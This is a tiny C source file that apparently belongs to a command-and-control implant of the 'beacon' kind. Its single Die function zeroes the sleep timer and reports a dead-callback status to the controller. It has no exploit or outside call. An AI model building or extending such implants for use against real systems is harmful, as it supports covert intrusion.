#include "pch.h"

#include "self.h"

#include "beacon.h"

int gSleepTime;

void Die(void)
{
	gSleepTime = 0;
	BeaconOutput(CALLBACK_DEAD, NULL, 0);
}